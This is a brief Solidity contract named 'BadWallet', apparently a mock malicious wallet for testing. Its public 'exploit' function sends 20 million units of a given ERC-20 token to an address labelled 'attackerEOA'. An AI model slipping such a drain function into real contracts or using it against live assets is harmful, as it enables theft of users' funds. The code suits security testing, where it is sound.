//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

contract BadWallet {
    function exploit(address token, address attackerEOA) public {
        IERC20(token).transfer(attackerEOA, 20_000_000 ether);
    }
}
